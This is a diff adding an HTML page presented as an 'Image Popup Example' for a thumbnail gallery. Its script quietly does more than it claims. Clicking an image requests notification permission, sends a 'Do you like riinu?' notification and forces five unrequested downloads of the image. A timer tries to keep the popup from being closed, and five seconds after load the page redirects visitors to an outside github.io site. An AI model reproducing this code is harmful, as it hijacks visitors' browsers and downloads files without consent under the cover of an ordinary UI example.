@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Popup Example</title>
+    <style>
+        /* Basic styling for the page */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .image-container {
+            position: relative;
+            margin: 10px;
+        }
+        .image-container img {
+            max-width: 100%;
+            height: auto;
+            cursor: pointer;
+        }
+        /* Popup window styling */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            max-width: 600px;
+            background-color: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+        }
+        .popup img {
+            width: 100%;
+            height: auto;
+        }
+        /* Overlay styling */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <img src="0524.jpg" alt="Sample Image 1" class="thumbnail">
+    </div>
+    <div class="image-container">
+        <img src="0524.jpg" alt="Sample Image 2" class="thumbnail">
+    </div>
+    <div class="image-container">
+        <img src="0524.jpg" alt="Sample Image 3" class="thumbnail">
+    </div>
+    <div class="image-container">
+        <img src="0524.jpg" alt="Sample Image 4" class="thumbnail">
+    </div>
+    <div class="image-container">
+        <img src="0524.jpg" alt="Sample Image 5" class="thumbnail">
+    </div>
+
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="popup">
+        <img src="" alt="Popup Image" id="popup-img">
+    </div>
+
+    <script>
+        // Get elements
+        const thumbnails = document.querySelectorAll('.thumbnail');
+        const popup = document.getElementById('popup');
+        const overlay = document.getElementById('overlay');
+        const popupImg = document.getElementById('popup-img');
+
+        // Function to show the popup
+        function showPopup(src) {
+            popupImg.src = src;
+            popup.style.display = 'block';
+            overlay.style.display = 'block';
+            sendNotification();
+            downloadImage(src, 5);  // Download the image 5 times
+        }
+
+        // Show popup when any image is clicked
+        thumbnails.forEach(thumbnail => {
+            thumbnail.addEventListener('click', () => {
+                showPopup(thumbnail.src);
+            });
+        });
+
+        // Function to send a notification
+        function sendNotification() {
+            // Check if the browser supports notifications
+            if ('Notification' in window) {
+                // Check the current notification permission
+                if (Notification.permission === 'granted') {
+                    // Send the notification
+                    new Notification('Do you like riinu?');
+                } else if (Notification.permission !== 'denied') {
+                    // Request notification permission
+                    Notification.requestPermission().then(permission => {
+                        if (permission === 'granted') {
+                            // Send the notification
+                            new Notification('Do you like riinu?');
+                        }
+                    });
+                }
+            }
+        }
+
+        // Function to download an image multiple times
+        function downloadImage(src, times) {
+            for (let i = 0; i < times; i++) {
+                const a = document.createElement('a');
+                a.href = src;
+                a.download = `0524_${i+1}.jpg`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }
+        }
+
+        // Function to keep the popup always visible
+        function keepPopupVisible() {
+            if (popup.style.display === 'none') {
+                showPopup(popupImg.src);
+            }
+        }
+
+        // Monitor the popup and overlay visibility
+        setInterval(keepPopupVisible, 100);
+
+        // Simulate completing the popup process and accessing the URL
+        function completePopupProcess() {
+            // Access the specified URL
+            window.location.href = 'https://ikecha.github.io/8888/';
+        }
+
+        // Example: Simulate the completion of the popup process after 5 seconds
+        setTimeout(completePopupProcess, 5000);
+    </script>
+</body>
+</html>
